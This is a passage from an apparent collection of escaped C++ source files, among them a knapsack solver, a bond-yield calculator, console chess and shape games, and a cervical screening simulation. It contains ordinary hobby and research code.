\u0442\u0440\u0430\u043d\u043a \u043d\u0430 \u0443\u0434\u0430\u043b\u0451\u043d\u043d\u043e\u043c \u043a\u043e\u043c\u043c\u0443\u0442\u0430\u0442\u043e\u0440\u0435\n                 << \"id_remote_switch INT NOT NULL,\"                   // \u0443\u0434\u0430\u043b\u0451\u043d\u043d\u044b\u0439 \u043a\u043e\u043c\u043c\u0443\u0442\u0430\u0442\u043e\u0440\n                 << \"time_zone INT NOT NULL,\"                          // \u0447\u0430\u0441\u043e\u0432\u043e\u0439 \u043f\u043e\u044f\u0441 \u043a\u043e\u043c\u043c\u0443\u0442\u0430\u0442\u043e\u0440\u0430\n                 << \"distance INT NOT NULL,\"                           // \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043f\u043e \u0432\u044b\u0431\u0440\u0430\u043d\u043d\u043e\u043c\u0443 \u043f\u0443\u0442\u0438\n                 << \"PRIMARY KEY (id));\";\n    create_stmt1.execute();\n\n    Poco::Data::Statement create_stmt2(session);\n\n    create_stmt2 << \"CREATE TABLE CDRs\"\n                 << \"(",
    "//\n//  main.cpp\n//  KnapsackProblem\n//\n//  Created by Woo Sung Jahng on 2024/04/24.\n//\n\n#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\n// Class for single element in set V\nclass Object {\nprivate:\n    int num; // Object No.\n    int size; // Size of object\n    int price; // Price of object\npublic:\n    Object(int num, int size, int price) {\n        this->num = num;\n        this->size = size;\n        this->price = price;\n    }\n    // Read object no.\n    int objnum() {\n        return num;\n    }\n    // Read the size of object\n    int objsize() {\n        return size;\n    }\n    // Read the price of object\n    int objprice() {\n        return price;\n    }\n};\n\n// Function for comparing price per size of two objects\nbool PricePerSize(Object& a, Object& b) {\n    return a.objprice()/a.objsize() > b.objprice()/b.objsize();\n}\n\nint main(int argc, const char * argv[]) {\n    int n, b, i, j;\n    \n    // Input n(size of set V)\n    n = 4;\n    \n    // Input b(size of knapsack)\n    b = 13;\n    \n    vector<int> sizes(n);\n    vector<int> prices(n);\n    \n    // Input size and price of objects\n    sizes = {2, 3, 5, 7};\n    prices = {500, 1000, 800, 900};\n    \n    vector<Object> obj;\n    for (i=0; i<n; i++) {\n        obj.emplace_back(i, sizes[i], prices[i]);\n    }\n    \n    // Sort objects by price per size by higher to lower\n    sort(obj.begin(), obj.end(), PricePerSize);\n    \n    \n//    // Check sorted vector obj\n//    cout << \"Order of sorted obj : \";\n//    for (auto& object : obj) cout << object.objnum() << \" \";\n//    cout << endl;\n    \n    int currentSize = 0;\n    int totalPrice = 0;\n    int maxPrice = 0;\n    \n    for (j=0; j<n; j++) {\n        for (i=j; i<n; i++) {\n            if (currentSize + obj[i].objsize() <= b) {\n                currentSize += obj[i].objsize();\n                totalPrice += obj[i].objprice();\n//                // Track calculation\n//                cout << '+' << obj[i].objprice() << endl;\n            }\n        }\n        if (totalPrice >= maxPrice) maxPrice = totalPrice;\n    }\n\n    // Print the maximum price value\n    cout << maxPrice << endl;\n}\n",
    "//\n// Created by Rikkual on 2024/4/25.\n//\n\n#include \"Printer.h\"\n#include \"TerminalControl.h\"\n\n#ifdef DEBUG_ABOUT_JUMP\nvoid Printer::printOpenDoor() {\n    ifstream file(\"OpenDoor.txt\");\n    int x = 1, y = 1;\n    string str;\n    while(getline(file, str)) {\n        gotoxy(x, y++);\n        cout << str;\n    }\n    file.close();\n}\n#endif\n\nvoid Printer::setxy(int x, int y) {\n    curX = x; curY = y;\n}\n\nint Printer::getX() const {\n    return curX;\n}\n\nint Printer::getY() const {\n    return curY;\n}\n\nvoid Printer::printCloseDoor() {\n    ifstream file(\"CloseDoor.txt\");\n    int x = 1, y = 1;\n    string str;\n    while(getline(file, str)) {\n        gotoxy(x, y++);\n        cout << str;\n    }\n    file.close();\n}\n\nstring transStr(const string &str) {\n    string res = {}, s = {};\n    bool flag = true;\n    for(auto it : str) {\n        if(flag) {\n            if(it == '[') {\n                flag = false;\n                continue;\n            }\n            res += it;\n        }\n        else {\n            if(it == ']') {\n                flag = true;\n                res += charMap.at(s);\n                s = {};\n                continue;\n            }\n            s += it;\n        }\n    }\n    return res;\n}\n\nvoid Printer::printAbout() {\n    ifstream file(\"About.txt\");\n    int x = ABOUT_X, y = ABOUT_Y;\n    string str;\n    while(getline(file, str)) {\n        gotoxy(x, y++);\n        str = transStr(str);\n        cout << str << endl;\n        if(COUT_ANIMATION) mySleep(ANIMATION_SPEED);\n    }\n    file.close();\n}\n\nvoid Printer::clearLine(int x, int y, int len, bool animation) {\n    gotoxy(x, y);\n    for(int i = 1; i <= len; i++) {\n        cout << \" \";\n    }\n    if(animation && COUT_ANIMATION) mySleep(ANIMATION_SPEED);\n}\n\nvoid Printer::clearLine(int x, int y, bool animation) {\n    clearLine(x, y, DELETE_LINE_LENGTH, animation);\n}\n\nvoid Printer::clearAbout(int y) {\n    // for(int i = 1; i <= 18; i++) {\n    for(int i = y; i >= 1; i--) {\n        clearLine(40, i);\n    }\n}\n\nvoid Printer::closeDoor() {\n    for(int i = 10; i >= 1; i--) {\n        for(int j = 2; j <= 17; j++) {\n            gotoxy(17 - i, j);\n            cout << \"\u2591\u2593\";\n            gotoxy(17 + i - 1, j);\n            cout << \"\u2593\u2591\";\n        }\n        mySleep(DOOR_SPEED);\n    }\n}\n\nvoid Printer::openDoor() {\n    for(int i = 1; i <= 10; i++) {\n        for(int j = 2; j <= 17; j++) {\n            gotoxy(17 - i, j);\n            cout << \"\u2593 \";\n            gotoxy(17 + i - 1, j);\n            cout << \" \u2593\";\n        }\n        mySleep(DOOR_SPEED);\n    }\n}\n\nvoid Printer::printFloorBase(int floor) {\n    int x = FLOOR_DISPLAY_X, y = FLOOR_DISPLAY_Y;\n    gotoxy(x - 1, y - 1);  cout << \"\u2554\u2550\u2566\u2550\u2557\";\n    gotoxy(x - 1, y + 0);  cout << \"\u2551 \u2551 \u2551\";\n    gotoxy(x - 1, y + 1);  cout << \"\u255a\u2550\u2569\u2550\u255d\";\n    gotoxy(x + 0, y + 0);  cout << floor;\n}\n\nvoid Printer::printDevisionLine(int &x, int &y, int len) {\n    gotoxy(x, y);\n    for(int i = 1; i <= len; i++) cout << \"=\";\n    cout << endl; y++;\n    if(COUT_ANIMATION) mySleep(ANIMATION_SPEED);\n}\n\nvoid Printer::setMessage(const string& _message) {\n    message = _message;\n}\n\nstring Printer::Message() const {\n    return message;\n}\n\nvoid Printer::printOptions(int x, int y, const std::vector<string>& options) {\n    Printer::printDevisionLine(x, y);\n    gotoxy(x, y++);\n    cout << message;\n    if(COUT_ANIMATION) mySleep(ANIMATION_SPEED);\n\n    Printer::printDevisionLine(x, y);\n    for(int i = 0; i < (int)options.size(); i++) {\n        gotoxy(x, y++);\n        cout << \"  \" << i + 1 << \". \" << options[i] << endl;\n        if(COUT_ANIMATION) mySleep(ANIMATION_SPEED);\n    }\n\n    Printer::printDevisionLine(x, y);\n    gotoxy(x, y++);\n    cout << \"\u8bf7\u8f93\u5165\u9009\u9879\uff1a\";\n}\n\nvoid Printer::print(const string &message, int x, int y) {\n    gotoxy(x, y);\n    cout << message;\n    curY++;\n}\n\nvoid Printer::print(const string &message) {\n    print(message, curX, curY);\n}\n",
    "#include <iostream>\r\n#include <cmath>\r\n#include <utility>\r\n\r\nclass Bond {\r\npublic:\r\n    Bond(double par, double coupon, unsigned int maturity) :\r\n        par(par), coupon(coupon), maturity(maturity) {}\r\n\r\n    double get_price(double yield) const {\r\n        double price(0.0);\r\n        double denominator(1.0);\r\n        for (unsigned int i = 0; i < maturity; ++i) {\r\n            denominator *= 1.0 + yield;\r\n            price += coupon / denominator;\r\n        }\r\n        price += par / denominator;\r\n        return price;\r\n    }\r\n\r\nprivate:\r\n    const double par;\r\n    const double coupon;\r\n    const unsigned int maturity;\r\n};\r\n\r\ntemplate <typename F>\r\ndouble secant_method(const F &f, double x0, double x1, double eps) {\r\n    do {\r\n        double f0 = f(x0);\r\n        double f1 = f(x1);\r\n        double x =  (x0 * f1 - x1 * f0) / (f1 - f0);\r\n        x0 = x1;\r\n        x1 = x;\r\n    } while (fabs(x1 - x0) >= eps);\r\n    return x1;\r\n}\r\n\r\nint main(){\r\n\r\nBond bond1{ 1000.0, 100.0, 10 };\r\nstd::cout << bond1.get_price(0.1138) << std::endl;\r\nBond bond2{ 100.0, 7.0, 5 };\r\nstd::cout << bond2.get_price(0.05819) << std::endl;\r\nstd::cout << bond2.get_price(0.08261) << std::endl;\r\nBond bond3{ 100.0, 5.0, 10 };\r\nstd::cout << bond3.get_price(0.04372) << std::endl;\r\nstd::cout << bond3.get_price(0.05669) << std::endl;\r\n\r\nauto f1 = [&bond1 = std::as_const(bond1)](double x) { return bond1.get_price(x) - 1050.0; };\r\nstd::cout << secant_method(f1, .1, .9, 1e-7) << std::endl;\r\nauto f2 = [&bond2 = std::as_const(bond2)](double x) { return bond2.get_price(x) - 90.0; };\r\nstd::cout << secant_method(f2, .1, .9, 1e-7) << std::endl;\r\nauto f3 = [&bond2 = std::as_const(bond2)](double x) { return bond2.get_price(x) - 110.0; };\r\nstd::cout << secant_method(f3, .1, .9, 1e-7) << std::endl;\r\nauto f4 = [&bond2 = std::as_const(bond2)](double x) { return bond2.get_price(x) - 99.0; };\r\nstd::cout << secant_method(f4, .1, .9, 1e-7) << std::endl;\r\nauto f5 = [&bond2 = std::as_const(bond2)](double x) { return bond2.get_price(x) - 101.0; };\r\nstd::cout << secant_method(f5, .1, .9, 1e-7) << std::endl;\r\n}\r\n",
    "#include \"GameInterface.h\" // Assuming GameInterface.h contains the class declaration\n#include <iostream> // For cout\n#include <fstream> // For file operations\n\nusing namespace std;\n\n// Function to clear the console screen\nvoid clearScreen() {\n\tsystem(\"cls\");\n}\n\n// Function to set the cursor position\nvoid setCursorPosition(int x, int y) {\n\tCOORD coord = { x, y };\n\tSetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\n}\n\nvoid GameInterface::printShape(Shape& shape) {\n\n\tif (shape.node->getColor() == \"red\")\n\t\tcout << ANSI_COLOR_RED;\n\telse if (shape.node->getColor() == \"green\")\n\t\tcout << ANSI_COLOR_GREEN;\n\telse if (shape.node->getColor() == \"blue\")\n\t\tcout << ANSI_COLOR_BLUE;\n\telse if (shape.node->getColor() == \"yellow\")\n\t\tcout << ANSI_COLOR_YELLOW;\n\telse\n\t\tcout << ANSI_COLOR_RESET;\n\tcout << \" \" << shape.node->getName() << ANSI_COLOR_RESET;\n\n\t//cout << \" \" << shape.node->getName() ;\n\n}\n\nvoid GameInterface::printList(ListOfShapes& list) {\n\n\tShape* current = list.getStart();\n\twhile (current != nullptr) {\n\t\tthis->printShape(*current);\n\t\tcurrent = current->next;\n\t}\n\n}\n\nvoid GameInterface::printListToFile(std::ofstream& file, ListOfShapes& list)  {\n\t// Get the start of the list\n\tShape* current = list.getStart();\n\tfile << \"List: \" << std::endl;\n\n\t// Traverse the list and print each shape's details to the file\n\twhile (current != nullptr) {\n\t\tfile << \"\tShape: \" << std::endl;\n\t\tfile << \"\t\tColor: \" << current->node->getColor() << std::endl;\n\t\tfile << \"\t\tName: \" << current->node->getName() << std::endl;\n\t\tcurrent = current->next;\n\t}\n}\n\n\n// Getter for score\nint GameInterface::getScore() {\n\treturn score;\n}\n\n// Setter for score\nvoid GameInterface::setScore(int newScore) {\n\tscore = newScore;\n}\n\n// Method to greet the user\nvoid GameInterface::helloInterface() {\n\tcout << \"Welcome to the Tetris Game !!!!\" << endl;\n\tcout << \"Press Enter to continue...\";\n\tcin.get();\n\tmenuInterface();\n}\n\n// Method to display the menu\nvoid GameInterface::menuInterface() {\n\tbool validChoice = false;\n\n\tdo {\n\t\tclearScreen();\n\t\tsetCursorPosition(2, 2);\n\t\tcout << \"Menu:  \" << endl;\n\t\tcout << \"           1. Start Game \" << endl;\n\t\tcout << \"           2. Load Game \" << endl;\n\t\tcout << \"           3. Store Game \" << endl;\n\t\tcout << \"           4. View High Scores \" << endl;\n\t\tcout << \"           5. Exit \" << endl;\n\n\n\t\tint choice = 0;\n\t\tcin >> choice;\n\n\t\tswitch (choice) {\n\t\tcase 1:\n\t\t\tfirstLevelInterface();\n\t\t\tvalidChoice = true;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Load Game\" << endl;\n\t\t\tvalidChoice = true;\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Store Game\" << endl;\n\t\t\tvalidChoice = true;\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"View High Scores\" << endl;\n\t\t\tvalidChoice = true;\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\tcout << \"Exiting...\" << endl;\n\t\t\tvalidChoice = true;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Invalid choice. Please select again.\" << endl;\n\t\t\tbreak;\n\t\t}\n\n\t\t// Pause to see the output\n\t\tcout << \"Press Enter to continue...\";\n\t\tcin.ignore();\n\t\tcin.get();\n\n\t} while (validChoice);\n\n}\n\n\n\n//used in Level\n\nvoid chooseColorForShift(ListOfShapes& shapeList) {\n\tcout << \"\tchoose : \\n\t\t1-red\\n\t\t2-blue\\n\t\t3-green\\n\t\t4-yellow\" << endl;\n\n\tchar choise = getchar();\n\tstd::cin.ignore();\n\n\tswitch (choise)\n\t{\n\tcase '1':\n\n\t\tshapeList.shiftShapesWithSameColor(\"red\");\n\t\tbreak;\n\tcase '2':\n\t\tshapeList.shiftShapesWithSameColor(\"blue\");\n\t\tbreak;\n\tcase '3':\n\t\tshapeList.shiftShapesWithSameColor(\"green\");\n\t\tbreak;\n\tcase '4':\n\t\tshapeList.shiftShapesWithSameColor(\"yellow\");\n\t\tbreak;\n\tdefault:\n\t\tchooseColorForShift(shapeList);\n\t\tbreak;\n\t}\n}\n\n void chooseNameForShift(ListOfShapes& shapeList) {\n\tcout << \"\tchoose : \\n\t\t1-SQUARE\\n\t\t2-TRIANGLE\\n\t\t3-CIRCLE\\n\t\t4-LOSANGE\" << endl;\n\tchar choise = getchar();\n\tstd::cin.ignore();\n\tswitch (choise)\n\t{\n\tcase '1':\n\t\tshapeList.shiftShapesWithSameName(\"SQUARE\");\n\t\tbreak;\n\tcase '2':\n\t\tshapeList.shiftShapesWithSameName(\"TRIANGLE\");\n\t\tbreak;\n\tcase '3':\n\t\tshapeList.shiftShapesWithSameName(\"CIRCLE\");\n\t\tbreak;\n\tcase '4':\n\t\tshapeList.shiftShapesWithSameName(\"LOSANGE\");\n\t\tbreak;\n\tdefault:\n\t\tchooseNameForShift(shapeList);\n\t\tbreak;\n\t}\n}\n\n\n// Methode to dipaly the first level\nvoid GameInterface::firstLevelInterface() {\n\n\tListOfShapes list;\n\tShape* nextShape = new Shape();\n\tShape* currentShape = new Shape();\n\tbool newShapeNeeded = true;\n\n\n\n\twhile (list.getShapeCount() < 15 ) {\n\n\t\tint userChoice;\n\n\t\tclearScreen();\n\n\t\tsetCursorPosition(2, 2);\n\t\tcout << \"Command:  \" << endl;\n\t\tcout << \"           a : insert in the start \" << endl;\n\t\tcout << \"           d : insert in the end \" << endl;\n\t\tcout << \"           w : to choose the wanted color shift \" << endl;\n\t\tcout << \"           s : to choose the wanted shape shift \" << endl;\n\t\tcout << \"           k : to store game and exit \" << endl;\n\n\t\tsetCursorPosition(2, 9);\n\t\tcout << \"---------   Score: \" << score << \"    -------------\";\n\n\t\tsetCursorPosition(50, 10);\n\t\tcout << \"Next Shape:  \";\n\t\tif (nextShape != nullptr)\n\t\t\tthis->printShape(*nextShape);\n\n\t\tsetCursorPosition(2, 10);\n\t\tcout << \"Current Shape: \";\n\t\tif (currentShape != nullptr)\n\t\t\tthis->printShap",
    " // Cervix Screening Program CSP\r\n// Marcel Greuter\r\n// 22 july 2021 - initial version 01\r\n// 24 july 2021 - version 02 sensitivities adapted according to values in Model01.pptx\r\n// 1 oct 2021 - version 03 MG: changed and corrected transition probabilities\r\n// 14 nov 2021 - trial version 04 MG: first cost-effectiveness version\r\n// 19 nov 2021 - bug fixed in readCumDeathProb, version ready for testing\r\n// 29 nov 2021 - final version 04 for testing... :)\r\n// 31 jan 2022 - after revision of the flow chart, version 05 was build, now ready for testing...\r\n// 4 feb 2022 - Version with new flow chart implemented\r\n// 5 feb 2022 - Debug function added to check flow chart\r\n// 6 feb 2022 -\tsurvival as a function of FIGO state coded\r\n// to do: false positives have to be added, compliance function has to be adapted, all parameters to an input file\r\n// 11 feb 2022 - version 06. adapted det file\r\n// 23 mrt 2022 - version 07. New flow chart\r\n// 31 mrt 2022 - update FIGO distribution and Survival (IKNL data)\r\n// 10 apr 2022 - Update survival as a function of stage and age: see routine TumorSurvival\r\n// 28 apr 2022 - Update Confirmatory diagnosis\r\n// 9 may 2022 - Check on opening output files, corrected CIN2 and CIN3 to HPV+ transition\r\n// 1 july 2022 - Add a screening test at age 65 if HPV+\r\n// 8 july 2022 - Version 11. Added number of detected stages in the output\r\n// 13 july 2022 - Number of detected stages per age in the output, compliance function also includes age 65\r\n// 21 july 2022 - Ndetected only counted for direct referrals. There was no Ndetected for age 65 because there are 8 screen ages, not 7: this has been corrected.\r\n// 25 july 2022 - Version 12. False positives included\r\n// 2 jan 2023 - Version 13b. Base case scenario\r\n// 13 jan 2023 - Age of death added to output, independent of participation in screening\r\n// 31 mar 2023 - Number of iterations include by Nit\r\n\r\n\r\n#include <iostream> \r\n#include <cstdlib> \r\n#include <time.h>\r\n#include <cmath>\r\n#include <conio.h>\r\n\r\n#define ScreeningOn 1// turn screening on or off\r\n#define Nwomen 100000\r\n#define debug 0\r\n#define Nit 10 \r\n\r\nusing namespace std; \r\n\r\nint CurrentState = 0 ;\r\nint age = 0 ;\r\nfloat cumDeathProb[101] ;\r\nint NFalsePositive = 0 ;\r\nfloat costs ;\r\nFILE *fp2 ;\r\nint FIGOstate ;\r\n\r\nint DetScreenAge = 0 ;\r\nint DetCompliance = 0 ;\r\nint DetReferral = 0 ;\r\nint DetState = -1 ;\r\nint DetFIGO = -1 ;\r\nfloat DetDeathAge = -1 ;\r\nfloat DetNaturalDeathAge = -1 ;\r\nint DetTreatment = 0 ;\t\t\t\t\t\t\t\t\t\t\t\t// 13-01-23 added\r\n\r\nint Ndetected[8][6] ; \t\t\t\t\t\t\t\t\t\t\t\t// detected lesions for 8 ages: 30, 35..65 and 6 stages: HPV-, HPV+, ... cancer \r\n\r\ndouble Random()\r\n{\r\n\treturn (double)rand() / (double)((unsigned)RAND_MAX + 1 ) ;\r\n}\r\n\r\nvoid HPVmin( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 0\r\n{\r\n\tdouble rnd = Random() ;\r\n\tif ( ( age >= 15 ) and ( age <= 24 ) and ( rnd < 0.074 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 25 ) and ( age <= 34 ) and ( rnd < 0.098 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 35 ) and ( age <= 44 ) and ( rnd < 0.050 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 45 ) and ( age <= 54 ) and ( rnd < 0.036 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 55 ) and ( rnd < 0.027 ) )\r\n\t\tCurrentState = 1 ;\r\n\r\n}\r\n\r\nvoid HPVplus( void )\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 1\r\n{\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.5034 ) \r\n\t\tCurrentState = 0 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.5034+0.0610 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.5034+0.0610+0.0034 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif ( rnd < 0.5034+0.0610+0.0034+0.0072  ) \r\n\t\t\t\t\t\tCurrentState = 4 ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid CIN1( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 2\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.4000 ) \r\n\t\tCurrentState = 0 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.4000+0.1600 ) \r\n\t\t\tCurrentState = 1 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif( rnd < 0.4000+0.1600+0.0242 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif( rnd < 0.4000+0.1600+0.0242+0.0047 ) \r\n\t\t\t\t\tCurrentState = 4 ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\t\t\r\n\r\nvoid CIN2( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 3\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.0073 ) \r\n\t\tCurrentState = 1 ; \r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.0073+0.0244 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.0073+0.0244+0.0474 ) \r\n\t\t\t\tCurrentState = 4 ;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid CIN3( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 4\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.0025 ) \r\n\t\tCurrentState = 1 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.0025+0.0074 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.0025+0.0074+0.0486 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif ( rnd < 0.0025+0.0074+0.0486+0.04) \r\n\t\t\t\t\tCurrentState = 5 ;\t\t\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t} \r\n\t\r\n\t\r\n// testing:\tCurrentState = 5 ;\r\n}\r\n\r\ndouble TumorSurvival( int age, int cc ) // Survivalprobability is given by y=a*exp(bt)+c\r\n{\r\n\tdouble y = Random() ;\r\n\tdouble t ;\r\n\tint j ;\r\n\tconst double a[5][7] = { {  2.010455946,  1.587227382,   1.891873867,  4.999864589,  9.895077586,  50.0,         76.9734858 },\r\n\t                         { 13.85142061,\t 12.08714041,   19.16786749,  37.30197723,  35.0043",
    "#include \"Chess.h\"\nbool Chess::isValidSelect(int sr, int sc, int turn)\n{\n\tif (sr >= rows || sc >= cols)\n\t\treturn false;\n\tif (turn == board.bs[sr][sc]->getColor()&&board.bs[sr][sc]->getSym()!='-')\n\t\treturn true;\n\treturn false;\n}\nbool Chess::isValidPlacement(int dr, int dc, int turn)\n{\n\tif (dr >= rows || dc >= cols)\n\t\treturn false;\n\tif (board.bs[dr][dc]->getColor() == turn&&board.bs[dr][dc]->getSym()!='-')\n\t\treturn false;\n\treturn true;\n}\nvoid Chess::changeTurn(int &turn)\n{\n\tturn == 0 ? turn = 1 : turn = 0;\n}\nvoid Chess::highLightPos(int sr, int sc, int turn)\n{\n\n\tfor (int i = 0; i < rows; ++i)\n\t{\n\t\tfor (int j = 0; j < cols; ++j)\n\t\t\tHPs[i][j] = (((isValidPlacement(i, j, turn) && board.bs[sr][sc]->isLegalMove(sr, sc, i, j, board.bs)&&removesCheck(sr,sc,i,j,turn))||(isValidCastle(sr,sc,i,j,turn)&&removesCheck(sr,sc,i,j,turn))));\n\t}\n\tHPs[sr][sc] = true; // Aesthetic :)\n\n}\nvoid Chess::findKing(int &kr , int &kc , int turn)\n{\n\tbool found = false;\n\tfor (int i = 0; i < rows; ++i)\n\t{\n\t\tfor (int j = 0; j < cols; ++j)\n\t\t{\n\t\t\tif ((turn == 0 && board.bs[i][j]->getSym() == 'K')||(turn == 1 && board.bs[i][j]->getSym() == 'k'))\n\t\t\t{\n\t\t\t\tkr = i, kc = j;\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (found)\n\t\t\tbreak;\n\t}\n}\nbool Chess::isCheck(int turn)\n{\n\tint kr, kc;\n\tchangeTurn(turn);\n\tfindKing(kr, kc, turn);\n\tchangeTurn(turn);\n\tfor (int i = 0; i < rows; ++i)\n\t{\n\t\tfor (int j = 0; j < cols; ++j)\n\t\t{\n\t\t\tif (isValidSelect(i, j, turn) && board.bs[i][j]->isLegalMove(i, j, kr, kc, board.bs))\n\t\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n\nbool Chess::removesCheck(int sr, int sc, int dr, int dc,int turn)\n{\n\tbool val = true;\n\tPiece* temp = board.bs[dr][dc];\t\t//Temporarily make move :)\n\tboard.bs[dr][dc] = board.bs[sr][sc];\n\tboard.bs[sr][sc] = new Piece;\n\tchangeTurn(turn);\n\tif (isCheck(turn))\n\t\tval = false;\n\n\tdelete board.bs[sr][sc];\n\tboard.bs[sr][sc] = board.bs[dr][dc];\t// Reverse temp move :D\n\tboard.bs[dr][dc] = temp;\t\t\t\t\n\t\n\treturn val;\n}\nbool Chess::NoLegalMoves(int turn)\n{\n\tfor (int i = 0; i < rows; ++i)\n\t{\n\t\tfor (int j = 0; j < cols; ++j)\n\t\t{\n\t\t\tif (isValidSelect(i, j, turn))\n\t\t\t{\n\t\t\t\tfor (int k = 0; k < rows; ++k)\n\t\t\t\t{\n\t\t\t\t\tfor (int l = 0; l < cols; ++l)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (isValidPlacement(k, l, turn) && board.bs[i][j]->isLegalMove(i, j, k, l, board.bs)&&removesCheck(i,j,k,l,turn))\n\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn true;\n}\nchar Chess::getPromote()\n{\n\tint ri=0, ci=0;\n\tBoard::gotoRowCol(15, 90);\n\tcout << \"Promote to?\";\n\tBoard::gotoRowCol(16, 90);\n\tcout << \"Q   N   B   R\";\n\twhile (true)\n\t{\n\t\tBoard::getRowColbyLeftClick(ri, ci);\n\t\tif (ri == 16 && ci == 90)\n\t\t\treturn 'Q';\n\t\tif (ri == 16 && ci == 94)\n\t\t\treturn 'N';\n\t\tif (ri == 16 && ci == 98)\n\t\t\treturn 'B';\n\t\tif (ri == 16 && ci == 102)\n\t\t\treturn 'R';\n\t}\n\t\n}\nvoid Chess::promote(int dr , int dc,char sym,int turn)\n{\n\tdelete board.bs[dr][dc];\n\tswitch (sym)\n\t{\n\tcase'Q':\n\t\tif (turn == 0)\n\t\t\tboard.bs[dr][dc] = new Queen(White);\n\t\telse\n\t\t\tboard.bs[dr][dc] = new Queen(Black);\n\t\tbreak;\n\tcase'N':\n\t\tif (turn == 0)\n\t\t\tboard.bs[dr][dc] = new Knight(White);\n\t\telse\n\t\t\tboard.bs[dr][dc] = new Knight(Black);\n\t\tbreak;\n\tcase'B':\n\t\tif (turn == 0)\n\t\t\tboard.bs[dr][dc] = new Bishop(White);\n\t\telse\n\t\t\tboard.bs[dr][dc] = new Bishop(Black);\n\t\tbreak;\n\tcase'R':\n\t\tif (turn == 0)\n\t\t\tboard.bs[dr][dc] = new Rook(White);\n\t\telse\n\t\t\tboard.bs[dr][dc] = new Rook(Black);\n\t\tbreak;\n\t}\n}\nvoid Chess::clearPromoteMsg()\n{\n\tBoard::gotoRowCol(15, 90);\n\tcout << \"           \";\n\tBoard::gotoRowCol(16, 90);\t\t//Aesthetic :)\n\tcout << \"             \";\n}\nbool Chess::checkPromotion(int dr, int dc)\n{\n\tif (board.bs[dr][dc]->getSym() == 'P' && dr == 0)\t// Pawn Reached End\n\t{\n\t\tchar sym;\n\t\tsym = getPromote();\n\t\tpromote(dr, dc, sym, 0);\t//White Pawn so turn == 0\n\t\tclearPromoteMsg();\n\t\treturn true;\n\t}\n\telse if(board.bs[dr][dc]->getSym() == 'p' && dr == 7)\n\t{\n\t\tchar sym;\n\t\tsym = getPromote();\n\t\tpromote(dr, dc, sym, 1);\t//Black Pawn so turn == 1\n\t\tclearPromoteMsg();\n\t\treturn true;\n\t}\n\treturn false;\n}\nbool Chess::isFreeSpace(int sr, int sc, int dr, int dc)\n{\n\tint mini = min(sc,dc), maxi = max(sc, dc);\n\tif (sc > dc)\n\t\tmini -= 2;\t\t\t// Long Castle\n\telse\n\t\tmaxi++;\t\t\t\t// Short Castle\n\tfor (int i = mini+1; i < maxi; ++i)\n\t{\n\t\tif (board.bs[sr][i]->getSym() != '-')\n\t\t\treturn false;\n\t}\n\treturn true;\n}\n\nbool Chess::noCheckWhileCastle(int sr, int sc, int dr, int dc, int turn)\n{\n\tint mini = min(sc, dc),maxi = max(sc,dc);\n\tchangeTurn(turn);\n\tfor (int i = mini + 1; i < maxi; ++i)\n\t{\n\t\tif (!removesCheck(sr, sc, dr, i, turn))\n\t\t\treturn false;\n\t}\n\treturn true;\n}\nbool Chess::isValidCastle(int sr,int sc,int dr,int dc,int turn)\n{\n\tchangeTurn(turn);\n\tif (isCheck(turn))\n\t\treturn false;\n\tif (board.bs[sr][sc]->getSym() != 'k' && board.bs[sr][sc]->getSym() != 'K')\n\t\treturn false;\n\tif (!board.bs[sr][sc]->getIsFirst())\n\t\treturn false;\n\tif (sr != dr || abs(sc - dc) != 2)\n\t\treturn false;\n\tif (sc < dc)\n\t{\n\t\tif ((board.bs[sr][dc + 1]->getSym() != 'r' && board.bs[sr][dc + 1]->getSym() != 'R') || !board.bs[sr][dc + 1]->getIsFirst())\n\t\t\treturn false;\n\t}\n\tif (sc > 